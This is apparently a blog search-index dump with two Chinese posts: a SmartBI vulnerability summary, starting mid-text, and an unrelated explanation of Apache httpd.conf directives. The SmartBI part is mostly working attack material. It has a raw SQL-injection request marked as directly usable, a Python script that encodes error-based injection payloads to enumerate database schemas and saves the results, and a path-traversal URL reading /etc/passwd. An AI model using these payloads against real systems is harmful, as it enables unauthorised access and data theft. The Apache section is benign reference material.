'~Mq/aM/mV/VK/aM/mM/V7/aM/m9/VM/am/m9/VK/a'/VJ/V9/uu/ut/uu6(dp/uu/NO/uu/aM/mV/VK/aM/mM/V7/aM/m9/VM/am/m9/VK/a'/VJ/V9/uu/ut/uu(SR(D/uu/NO/uu/aM/mV/VK/aM/mM/V7/aM/m9/VM/am/m9/VK/a'/VJ/V9/uu/ut/uug(SQp/uu/NO/uu/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/uu/9T/ut/9V/uuRh/uu/NO/uuoQk5QkL(4(dpkp4qcK7u'1h'171M('~iu'~iu7uN171M((7~pu1m9u'~Mq/aM/mV/VK/aM/mM/V7/aM/m9/VM/am/m9/VK/aM/OT/Ou/uu/ut/uu6(dp/uu/NO/uu/aM/mV/VK/aM/mM/V7/aM/m9/VM/am/m9/VK/aM/OT/Ou/uu/ut/uu(SR(D/uu/NO/uu/aM/mV/VK/aM/mM/V7/aM/m9/VM/am/m9/VK/aM/OT/Ou/uu/ut/uug(SQp/uu/NO/uu/uu/ut/uuhRD5S(2Z(SQp/uu/NO/uu/uu/9T/JT&amp;pageId=0&amp;writeBackData=&amp;exportSheetIndexes=&amp;exportId=&amp;op=%7B%22getTotalPages%22%3Atrue%2C%22sheetPageCounts%22%3A%5B1%5D%7D 解码并修改数据包直接注入（可直接使用）：修改paramsInfoEncode为paramsInfo，将Encode参数去掉 123456789101112131415POST /vision/ssreportServlet HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: https://127.0.0.1/vision/openresource.jsp?iPad=true&amp;refresh=true&amp;showtoolbar=false&amp;showPath=false&amp;resid=I40281d81016a8bc28bc20231016aaee007b230ac&amp;_timestamp=1610433924926Content-Type: application/x-www-form-urlencodedContent-Length: 3282Authorization: Basic YWRtaW46YWRtaW4=Connection: closeCookie: FQPassword=; JSESSIONID=4BB550BF10C606619B753D3CE52CD3ABUpgrade-Insecure-Requests: 1sheetIndex=0&amp;resid=I40281d81016a8bc28bc20231016aaee007b230ac&amp;clientId=Iff8080810176f0c7f0c7544f0176f54eb72c1160&amp;refreshType=refresh&amp;paramsInfo=%5B%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E5%8D%95%E4%BD%8D%E5%90%8D%E7%A7%B0%22%2C%22name%22%3A%22%E5%8D%95%E4%BD%8D%E5%90%8D%E7%A7%B0%22%2C%22alias%22%3A%22%E5%8D%95%E4%BD%8D%E5%90%8D%E7%A7%B0%22%2C%22value%22%3A%22'11111%22%2C%22displayValue%22%3A%22'11111%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%89%80%E5%B1%9E%E6%9C%BA%E6%9E%84%22%2C%22name%22%3A%22%E6%89%80%E5%B1%9E%E6%9C%BA%E6%9E%84%22%2C%22alias%22%3A%22%E6%89%80%E5%B1%9E%E6%9C%BA%E6%9E%84%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%89%80%E5%9C%A8%E7%9C%81%E4%BB%BD%22%2C%22name%22%3A%22%E6%89%80%E5%9C%A8%E7%9C%81%E4%BB%BD%22%2C%22alias%22%3A%22%E6%89%80%E5%9C%A8%E7%9C%81%E4%BB%BD%22%2C%22value%22%3A%22440000%22%2C%22displayValue%22%3A%22%E5%B9%BF%E4%B8%9C%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%89%80%E5%9C%A8%E5%9C%B0%E5%B8%82%22%2C%22name%22%3A%22%E6%89%80%E5%9C%A8%E5%9C%B0%E5%B8%82%22%2C%22alias%22%3A%22%E6%89%80%E5%9C%A8%E5%9C%B0%E5%B8%82%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%E5%85%A8%E9%83%A8%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%89%80%E5%9C%A8%E5%8C%BA%E5%8E%BF%22%2C%22name%22%3A%22%E6%89%80%E5%9C%A8%E5%8C%BA%E5%8E%BF%22%2C%22alias%22%3A%22%E6%89%80%E5%9C%A8%E5%8C%BA%E5%8E%BF%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%E5%85%A8%E9%83%A8%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.id%22%2C%22name%22%3A%22id%22%2C%22alias%22%3A%22%E6%A3%80%E6%B5%8B%E6%9C%BA%E6%9E%84id%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22name%22%3A%22%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22alias%22%3A%22%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22name%22%3A%22%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22alias%22%3A%22%E5%A1%AB%E6%8A%A5%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22name%22%3A%22%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22alias%22%3A%22%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E8%B5%B7%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%2C%7B%22id%22%3A%22OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22name%22%3A%22%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22alias%22%3A%22%E6%9B%B4%E6%96%B0%E6%97%B6%E9%97%B4%E6%AD%A2%22%2C%22value%22%3A%22%22%2C%22displayValue%22%3A%22%22%7D%5D&amp;pageId=0&amp;writeBackData=&amp;exportSheetIndexes=&amp;exportId=&amp;op=%7B%22getTotalPages%22%3Atrue%2C%22sheetPageCounts%22%3A%5B1%5D%7D py脚本RMI加密后注入报错注入demo： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#coding=utf-8import requestsfrom urllib.parse import quote,unquoteimport refrom requests.packages.urllib3.exceptions import InsecureRequestWarning#去除https的warningrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)ENCODING_SCHEDULE = { &quot;0&quot;: &quot;7&quot;, &quot;1&quot;: &quot;1&quot;, &quot;2&quot;: &quot;u&quot;, &quot;3&quot;: &quot;N&quot;, &quot;4&quot;: &quot;K&quot;, &quot;5&quot;: &quot;J&quot;, &quot;6&quot;: &quot;M&quot;, &quot;7&quot;: &quot;9&quot;, &quot;8&quot;: &quot;'&quot;, &quot;9&quot;: &quot;m&quot;, &quot;!&quot;: &quot;P&quot;, &quot;%&quot;: &quot;/&quot;, &quot;'&quot;: &quot;n&quot;, &quot;(&quot;: &quot;A&quot;, &quot;)&quot;: &quot;E&quot;, &quot;*&quot;: &quot;s&quot;, &quot;+&quot;: &quot;+&quot;, &quot;-&quot;: &quot;f&quot;, &quot;.&quot;: &quot;q&quot;, &quot;A&quot;: &quot;O&quot;, &quot;B&quot;: &quot;V&quot;, &quot;C&quot;: &quot;t&quot;, &quot;D&quot;: &quot;T&quot;, &quot;E&quot;: &quot;a&quot;, &quot;F&quot;: &quot;x&quot;, &quot;G&quot;: &quot;H&quot;, &quot;H&quot;: &quot;r&quot;, &quot;I&quot;: &quot;c&quot;, &quot;J&quot;: &quot;v&quot;, &quot;K&quot;: &quot;l&quot;, &quot;L&quot;: &quot;8&quot;, &quot;M&quot;: &quot;F&quot;, &quot;N&quot;: &quot;3&quot;, &quot;O&quot;: &quot;o&quot;, &quot;P&quot;: &quot;L&quot;, &quot;Q&quot;: &quot;Y&quot;, &quot;R&quot;: &quot;j&quot;, &quot;S&quot;: &quot;W&quot;, &quot;T&quot;: &quot;*&quot;, &quot;U&quot;: &quot;z&quot;, &quot;V&quot;: &quot;Z&quot;, &quot;W&quot;: &quot;!&quot;, &quot;X&quot;: &quot;B&quot;, &quot;Y&quot;: &quot;)&quot;, &quot;Z&quot;: &quot;U&quot;, &quot;a&quot;: &quot;(&quot;, &quot;b&quot;: &quot;~&quot;, &quot;c&quot;: &quot;i&quot;, &quot;d&quot;: &quot;h&quot;, &quot;e&quot;: &quot;p&quot;, &quot;f&quot;: &quot;_&quot;, &quot;g&quot;: &quot;-&quot;, &quot;h&quot;: &quot;I&quot;, &quot;i&quot;: &quot;R&quot;, &quot;j&quot;: &quot;.&quot;, &quot;k&quot;: &quot;G&quot;, &quot;l&quot;: &quot;S&quot;, &quot;m&quot;: &quot;d&quot;, &quot;n&quot;: &quot;6&quot;, &quot;o&quot;: &quot;w&quot;, &quot;p&quot;: &quot;5&quot;, &quot;q&quot;: &quot;0&quot;, &quot;r&quot;: &quot;4&quot;, &quot;s&quot;: &quot;D&quot;, &quot;t&quot;: &quot;k&quot;, &quot;u&quot;: &quot;Q&quot;, &quot;v&quot;: &quot;g&quot;, &quot;w&quot;: &quot;b&quot;, &quot;x&quot;: &quot;C&quot;, &quot;y&quot;: &quot;2&quot;, &quot;z&quot;: &quot;X&quot;, &quot;~&quot;: &quot;e&quot;, &quot;_&quot;: &quot;y&quot;,}DECODING_SCHEDULE = { &quot;7&quot;: &quot;0&quot;, &quot;1&quot;: &quot;1&quot;, &quot;u&quot;: &quot;2&quot;, &quot;N&quot;: &quot;3&quot;, &quot;K&quot;: &quot;4&quot;, &quot;J&quot;: &quot;5&quot;, &quot;M&quot;: &quot;6&quot;, &quot;9&quot;: &quot;7&quot;, &quot;'&quot;: &quot;8&quot;, &quot;m&quot;: &quot;9&quot;, &quot;P&quot;: &quot;!&quot;, &quot;/&quot;: &quot;%&quot;, &quot;n&quot;: &quot;'&quot;, &quot;A&quot;: &quot;(&quot;, &quot;E&quot;: &quot;)&quot;, &quot;s&quot;: &quot;*&quot;, &quot;+&quot;: &quot;+&quot;, &quot;f&quot;: &quot;-&quot;, &quot;q&quot;: &quot;.&quot;, &quot;O&quot;: &quot;A&quot;, &quot;V&quot;: &quot;B&quot;, &quot;t&quot;: &quot;C&quot;, &quot;T&quot;: &quot;D&quot;, &quot;a&quot;: &quot;E&quot;, &quot;x&quot;: &quot;F&quot;, &quot;H&quot;: &quot;G&quot;, &quot;r&quot;: &quot;H&quot;, &quot;c&quot;: &quot;I&quot;, &quot;v&quot;: &quot;J&quot;, &quot;l&quot;: &quot;K&quot;, &quot;8&quot;: &quot;L&quot;, &quot;F&quot;: &quot;M&quot;, &quot;3&quot;: &quot;N&quot;, &quot;o&quot;: &quot;O&quot;, &quot;L&quot;: &quot;P&quot;, &quot;Y&quot;: &quot;Q&quot;, &quot;j&quot;: &quot;R&quot;, &quot;W&quot;: &quot;S&quot;, &quot;*&quot;: &quot;T&quot;, &quot;z&quot;: &quot;U&quot;, &quot;Z&quot;: &quot;V&quot;, &quot;!&quot;: &quot;W&quot;, &quot;B&quot;: &quot;X&quot;, &quot;)&quot;: &quot;Y&quot;, &quot;U&quot;: &quot;Z&quot;, &quot;(&quot;: &quot;a&quot;, &quot;~&quot;: &quot;b&quot;, &quot;i&quot;: &quot;c&quot;, &quot;h&quot;: &quot;d&quot;, &quot;p&quot;: &quot;e&quot;, &quot;_&quot;: &quot;f&quot;, &quot;-&quot;: &quot;g&quot;, &quot;I&quot;: &quot;h&quot;, &quot;R&quot;: &quot;i&quot;, &quot;.&quot;: &quot;j&quot;, &quot;G&quot;: &quot;k&quot;, &quot;S&quot;: &quot;l&quot;, &quot;d&quot;: &quot;m&quot;, &quot;6&quot;: &quot;n&quot;, &quot;w&quot;: &quot;o&quot;, &quot;5&quot;: &quot;p&quot;, &quot;0&quot;: &quot;q&quot;, &quot;4&quot;: &quot;r&quot;, &quot;D&quot;: &quot;s&quot;, &quot;k&quot;: &quot;t&quot;, &quot;Q&quot;: &quot;u&quot;, &quot;g&quot;: &quot;v&quot;, &quot;b&quot;: &quot;w&quot;, &quot;C&quot;: &quot;x&quot;, &quot;2&quot;: &quot;y&quot;, &quot;X&quot;: &quot;z&quot;, &quot;e&quot;: &quot;~&quot;, &quot;y&quot;: &quot;_&quot;,}#此函数可以用来加密明文也可以解密服务器返回的密文def encode(code): out = &quot;&quot; for item in code: out = out + ENCODING_SCHEDULE.get(item, item) return outdef decode(code): out = &quot;&quot; for item in code: out = out + DECODING_SCHEDULE.get(item, item) return outurl = &quot;https://127.0.0.1/vision/ssreportServlet&quot;headers = {&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36&quot;, &quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;, &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;, &quot;Cookie&quot;:&quot;JSESSIONID=4BB550BF10C606619B753D3CE52CD3AB&quot; }origin1 = '''[{&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.单位名称&quot;,&quot;name&quot;:&quot;单位名称&quot;,&quot;alias&quot;:&quot;单位名称&quot;,&quot;value&quot;:&quot;'''origin2 = '''&quot;,&quot;displayValue&quot;:&quot;'''origin3 = '''&quot;},{&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.所属机构&quot;,&quot;name&quot;:&quot;所属机构&quot;,&quot;alias&quot;:&quot;所属机构&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;},{&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.所在省份&quot;,&quot;name&quot;:&quot;所在省份&quot;,&quot;alias&quot;:&quot;所在省份&quot;,&quot;value&quot;:&quot;440000&quot;,&quot;displayValue&quot;:&quot;广东&quot;},{&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.所在地市&quot;,&quot;name&quot;:&quot;所在地市&quot;,&quot;alias&quot;:&quot;所在地市&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;全部&quot;},{&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.所在区县&quot;,&quot;name&quot;:&quot;所在区县&quot;,&quot;alias&quot;:&quot;所在区县&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;全部&quot;},{&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.id&quot;,&quot;name&quot;:&quot;id&quot;,&quot;alias&quot;:&quot;检测机构id&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;},{&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.填报时间起&quot;,&quot;name&quot;:&quot;填报时间起&quot;,&quot;alias&quot;:&quot;填报时间起&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;},{&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.填报时间止&quot;,&quot;name&quot;:&quot;填报时间止&quot;,&quot;alias&quot;:&quot; 填报时间止&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;},{&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.更新时间起&quot;,&quot;name&quot;:&quot;更新时间起&quot;,&quot;alias&quot;:&quot;更新时间起&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;},{&quot;id&quot;:&quot;OutputParameter.I40281d81016a8bc28bc20231016aa0be219728b6.更新时间止&quot;,&quot;name&quot;:&quot;更新时间止&quot;,&quot;alias&quot;:&quot;更新时间止&quot;,&quot;value&quot;:&quot;&quot;,&quot;displayValue&quot;:&quot;&quot;}]'''for i in range(1,20): payload = &quot;%' and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata limit {0},1),0x7e)) and null = '%&quot;.format(i) # print(payload) origin_full = origin1 + payload + origin2 + payload + origin3 # print(origin_full) url_encode_full = quote(origin_full) # print(url_encode_full) rmi_encode = encode(url_encode_full) # print(rmi_encode) encode_final = 'encode='+rmi_encode data = { &quot;resid&quot;:&quot;I40281d81016a8bc28bc20231016aaee007b230ac&quot;, &quot;clientId&quot;:&quot;Iff8080810176f0c7f0c7544f0176f54eb72c1160&quot;, &quot;refreshType&quot;:&quot;refresh&quot;, &quot;paramsInfoEncode&quot;:encode_final } #proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'} r = requests.post(url,data=data,headers=headers,verify=False) #print(r.text) regex = r&quot;~\\w+~&quot; match = re.search(regex,r.text).span() #返回第一个匹配到的结果的位置（1000,1005） database = r.text[match[0]+1:match[1]-1] print(r.text[match[0]:match[1]]) with open('file.txt','a+') as f: f.write(database+'\\n') 在想怎么结合sqlmap写tamper指定位置实现注入，需要修改tamper 大佬们求带~~ 任意文件读取V85以下的可能任意文件下载都有。V95版本不存在。 1https://127.0.0.1/vision/FileServlet?ftpType=out&amp;path=upload/../../../../../../../../../../etc/passwd&amp;name=%E4%B8%AD%E5%9B%BD%E7%9F%B3%E6%B2%B9%E5%90%89%E6%9E%97%E7%99%BD%E5%9F%8E%E9%94%80%E5%94%AE%E5%88%86%E5%85%AC%E5%8F%B8XX%E5%8A%A0%E6%B2%B9%E7%AB%99%E9%98%B2%E9%9B%B7%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E9%A2%84%E6%A1%88.docx 参考：https://www.onebug.org/huwangVuln/98921.html https://mp.weixin.qq.com/s/iWTq4-74gz6nCd0G4blmTQ","link":"/2021/01/12/smartBi%E6%80%BB%E7%BB%93/"},{"title":"Apache配置文件（httpd.conf）详解","text":"ServerRoot服务器的基础目录，一般来说它将包含conf/和logs/子目录，其它配置文件的相对路径即基于此目录。默认为安装目录，不需更改。 语法：ServerRootdirectory-path 如： ServerRoot”/usr/local/apache-2.2.6” 注意，此指令中的路径最后不要加 / 。 Listen指定服务器监听的IP和端口。默认情况下Apache会在所有IP地址上监听。Listen是Apache2.0以后版本必须设置的指令，如果在配置文件中找不到这个指令，服务器将无法启动。 语法：Listen[IP-address:]portnumber [protocol] Listen指令指定服务器在那个端口或地址和端口的组合上监听接入请求。如果只指定一个端口，服务器将在所有地址上监听该端口。如果指定了地址和端口的组合，服务器将在指定地址的指定端口上监听。可选的protocol参数在大多数情况下并不需要，若未指定该参数，则将为443端口使用默认的https 协议，为其它端口使用http协议。 使用多个Listen指令可以指定多个不同的监听端口和/或地址端口组合。 默认为：Listen 80 如果让服务器接受80和8080端口上请求，可以这样设置： Listen 80 Listen 8080 如果让服务器在两个确定的地址端口组合上接受请求，可以这样设置： Listen 192.168.2.1:80 Listen 192.168.2.2:8080 如果使用IPV6地址，必须用方括号把IPV6地址括起来： Listen[2001:db8::a00:20ff:fea7:ccea]:80 LoadModule加载特定的DSO模块。Apache默认将已编译的DSO模块存放于4.1目录结构小节中所示的动态加载模块目录中。 语法：LoadModule modulefilename 如：LoadModulerewrite_module modules/mod_rewrite.so 如果filename使用相对路径，则路径是相对于ServerRoot所指示的相对路径。 Apache配置文件默认加载所有已编译的DSO模块，笔者建议只加载如下模块：authn_file、authn_default、 authz_host、authz_user、authz_default、auth_basic、dir、alias、filter、speling、 log_config、env、vhost_alias、setenvif、mime、negotiation、rewrite、deflate、 expires、headers、cache、file-cache、disk-cache、mem-cache。 User设置实际提供服务的子进程的用户。为了使用这个指令，服务器必须以root身份启动和初始化。如果你以非root身份启动服务器，子进程将不能够切换至非特权用户，并继续以启动服务器的原始用户身份运行。如果确实以root用户启动了服务器，那么父进程将仍然以root身份运行。 用于运行子进程的用户必须是一个没有特权的用户，这样才能保证子进程无权访问那些不想为外界所知的文件，同样的，该用户亦需没有执行那些不应当被外界执行的程序的权限。强烈建议专门为Apache子进程建立一个单独的用户和组。一些管理员使用nobody用户，但是这并不能总是符合要求，因为可能有其他程序也在使用这个用户。 例：User daemon Group设置提供服务的Apache子进程运行时的用户组。为了使用这个指令，Apache必须以root初始化启动，否则在切换用户组时会失败，并继续以初始化启动时的用户组运行。 例：Group daemon ServerAdmin设置在所有返回给客户端的错误信息中包含的管理员邮件地址。 语法：ServerAdminemail-address|URL 如果httpd不能将提供的参数识别为URL，它就会假定它是一个email-address ，并在超连接中用在mailto:后面。推荐使用一个Email地址，因为许多CGI脚本是这样认为的。如果你确实想使用URL，一定要保证指向一个你能够控制的服务器，否则用户将无法确保一定可以和你取得联系。 ServerName设置服务器用于辨识自己的主机名和端口号。 语法：ServerName[scheme://]fully-qualified-domain-name[:port] 可选的’scheme://‘前缀仅在2.2.3以后的版本中可用，用于在代理之后或离线设备上也能正确的检测规范化的服务器URL。 当没有指定ServerName时，服务器会尝试对IP地址进行反向查询来推断主机名。如果在ServerName中没有指定端口号，服务器会使用接受请求的那个端口。 为了加强可靠性和可预测性，建议使用ServerName显式的指定一个主机名和端口号。 如果使用的是基于域名的虚拟主机，在段中的ServerName将是为了匹配这个虚拟主机，在”Host:”请求头中必须出现的主机名。 DocumentRoot设置Web文档根目录。 语法：DocumentRootdirectory-path 在没有使用类似Alias这样的指令的情况下，服务器会将请求中的URL附加到DocumentRoot后面以构成指向文档的路径。 如果directory-path不是绝对路径，则被假定为是相对于ServerRoot的路径。 指定DocumentRoot时不应包括最后的”/“。 &lt;’Directory’&gt;和用于封装一组指令，使之仅对某个目录及其子目录生效。 语法： … Directory-path可以是一个目录的完整路径，或是包含了Unixshell匹配语法的通配符字符串。在通配符字符串中，”?”匹配任何单个的字符，”*”匹配任何字符序列。也可以使用”[]”来确定字符范围。在”~” 字符之后也可以使用正则表达式。 如果有多个(非正则表达式)配置段符合包含某文档的目录(或其父目录)，那么指令将以短目录优先的规则进行应用，并包含.htaccess文件中的指令。 正则表达式将在所有普通配置段之后予以考虑。所有的正则表达式将根据它们出现在配置文件中的顺序进行应用。 指令不可被嵌套使用，也不能出现在或配置段中。 &lt;‘Files’&gt;提供基于文件名的访问控制，类似于和指令。 语法： … filename参数应当是一个文件名或是一个包含通配符的字符串，其中”?”匹配任何单个字符，”*”匹配任何字符串序列。在”~”字符之后可以使用正则表达式。 在此配置段中定义的指令将作用于其基本名称(不是完整的路径)与指定的文件名相符的对象。段将根据它们在配置文件中出现的顺序被处理：在段和.htaccess文件被处理之后，但在段之前。能嵌入到段中以限制它们作用的文件系统范围，也可用于.htaccess文件当中，以允许用户在文件层面上控制对它们自己文件的访问。 &lt;‘IfModule&gt;封装根据指定的模块是否启用而决定是否生效的指令。 语法：&lt;IfModule[!]module-file|module-identifier&gt; … module-file是指编译模块时的文件名，比如mod_rewrite.c 。 module-identifier是指模块的标识符，比如mod_rewrite 。 在配置段中的指令仅当测试结果为真的时候才进行处理，否则所有其间的指令都将被忽略。 Options控制在特定目录中将使用哪些服务器特性 语法：Options [+|-]option[[+|-]option] … option可以为None，不启用任何额外特性，或者下面选项中的一个或多个： All 除MultiViews之外的所有特性，这是默认设置。 ExecCGI 允许使用mod_cgi执行CGI脚本。 FollowSymLinks 服务器允许在此目录中使用符号连接，如果此配置位于配置段中，则会被忽略。 Includes 允许使用mod_include提供的服务器端包含。 IncludesNOEXEC 允许服务器端包含，但禁用”#execcmd”和”#exec cgi”，但仍可以从ScriptAlias目录使用”#include virtual”虚拟CGI脚本。 Indexes 如果一个映射到目录的URL被请求，而此目录中又没有DirectoryIndex(例如：index.html)，那么服务器会返回由mod_autoindex生成的一个格式化后的目录列表。 MultiViews 允许使用mod_negotiation提供内容协商的”多重视图”(MultiViews)。 SymLinksIfOwnerMatch 服务器仅在符号连接与其目的目录或文件的拥有者具有相同的uid时才使用它。 如果此配置出现在配置段中，则将被忽略。 一般来说，如果一个目录被多次设置了Options，则最特殊的一个会被完全接受(其它的被忽略)，而各个可选项的设定彼此并不融合。然而，如果所有作用于Options指令的可选项 前都加有”+” 或”-“符号，此可选项将被合并。所有前面加有”+”号的可选项将强制覆盖当前的可选项设置，而所有前面有”-“号的可选项将强制从当前可选项设置中去除。 AllowOverride确定允许存在于.htaccess文件中的指令类型。 语法：AllowOverrideAll|None|directive-type [directive-type] … 如果此指令被设置为None ，那么.htaccess文件将被完全忽略。事实上，服务器根本不会读取.htaccess文件。 当此指令设置为All时，所有具有”.htaccess”作用域的指令都允许出现在.htaccess文件中。 directive-type可以是下列各组指令之一： AuthConfig 允许使用与认证授权相关的指令 FileInfo 允许使用控制文档类型的指令、控制文档元数据的指令、mod_rewrite中的指令、mod_actions中的Action指令 Indexes 允许使用控制目录索引的指令 Limit 允许使用控制主机访问的指令 Options[=Option,…] 允许使用控制指定目录功能的指令(Options和XBitHack)。可以在等号后面附加一个逗号分隔的(无空格的)Options选项列表，用来控制允许Options指令使用哪些选项。 AllowOverride仅在不包含正则表达式的配置段中才是有效的。在, , 配置段中都是无效的。 Order：控制默认的访问状态与Allow和Deny指令生效的顺序。 Ordering取值范围是以下几种范例之一： Deny,Allow Deny指令在Allow指令之前被评估。默认允许所有访问。任何不匹配Deny指令或者匹配Allow指令的客户都被允许访问。 Allow,Deny Allow指令在Deny指令之前被评估。默认拒绝所有访问。任何不匹配Allow指令或者匹配Deny指令的客户都将被禁止访问。 Mutual-failure 只有出现在Allow列表并且不出现在Deny列表中的主机才被允许访问。这种顺序与”OrderAllow,Deny”具有同样效果，不赞成使用。 关键字只能用逗号分隔，它们之间不能有空格，在所有情况下每个Allow和Deny指令语句都将被评估。 Allow：控制哪些主机可以访问服务器的该区域。可以根据主机名、IP地址、 IP地址范围或其他环境变量中捕获的客户端请求特性进行控制。 语法：Allow fromall|host|env=env-variable [host|env=env-variable] … 这个指令的第一个参数总是”from”，随后的参数可以有三种不同形式：如果指定”Allow from all”，则允许所有主机访问，按照下述Deny和Order指令的配置；若要只允许特定的主 机或主机群访问服务器，host可以用下面任何一种格式来指定：一个（部分）域名、完整的IP地址、部分IP地址、网络/掩码、网络/nnn无类别域间路由规格；第三种参数格式允许 对服务器的访问由环境变量的一个扩展指定，指定”Allowfrom env=env-variable”时，如果环境变量env-variable存在则访问被允许，使用由mod_setenvif提供的指令，服务器用 一种基于客户端请求的弹性方式提供了设置环境变量的能力。因此，这条指令可以用于允许基于像User-Agent(浏览器类型)、Referer或其他 HTTP请求头字段的访问。 Deny：控制哪些主机被禁止访问服务器的该区域。可以根据主机名、IP地址、 IP地址范围或其他环境变量中捕获的客户端请求特性进行控制。 语法：Deny from all|host|env=env-variable[host|env=env-variable] … 此指令的参数设置和Allow指令完全相同。 \\14. DirectoryIndex：当客户端请求一个目录时寻找的资源列表。 语法：DirectoryIndexLocal-url [Local-url] … Local-url(%已解码的)是一个相对于被请求目录的文档的URL(通常是那个目录中的一个文件)。可以指定多个URL，服务器将返回最先找到的那一个，比如： DirectoryIndex index.htmlindex.php \\15. ErrorLog：指定当服务器遇到错误时记录错误日志的文件。 语法：ErrorLogfile-path|syslog[:facility] 如果file-path不是一个以斜杠(/)开头的绝对路径，那么将被认为是一个相对于ServerRoot的相对路径；如果file-path以一个管道符号(|)开头，那么会为它指定一个命令来处理 错误日志，如 ErrorLog”|/usr/local/sbin/cronolog /var/log/httpd/%w/errors_log” 。 如果系统支持，使用”syslog”替代文件名将通过 syslogd(8)来记载日志。默认将使用系统日志机制local7 ，但您可以用”syslog:facility”语法来覆盖这个设置，其中，facility 的取值为syslog(1)中记载的任何一个名字。 LogLevel用于调整记录在错误日志中的信息的详细程度。 语法：LogLevel level 可以选择下列level，依照重要性降序排列： emerg 紧急(系统无法使用) alert 必须立即采取措施 crit 致命情况 error 错误情况 warn 警告情况 notice 一般重要情况 info 普通信息 debug 调试信息 当指定了某个级别时，所有级别高于它的信息也会被同时记录。比如，指定 LogLevel info ，则所有notice和warn级别的信息也会被记录。建议至少使用crit级别。 当错误日志是一个单独分开的正式文件的时候，notice级别的消息总是会被记录下来，而不能被屏蔽。但是，当使用syslog来记录时就没有这个问题。 LogFormat定义访问日志的记录格式。 语法：LogFormatformat|nickname [nickname] LogFormat指令可以使用两种定义格式中的一种。 在第一种格式中，指令只带一个参数，以定义后续的TransferLog指令定义的日志格式。另外它也可以通过下述的方法使用nickname来引用某个之前的LogFormat定义的日志格式。 第二种定义LogFormat指令的格式中，将一个直接的format和一个nickname联系起来。这样在后续的LogFormat或 CustomLog指令中，就不用一再重复整个冗长的格式串。定义别名 的LogFormat指令仅仅用来定义一个nickname 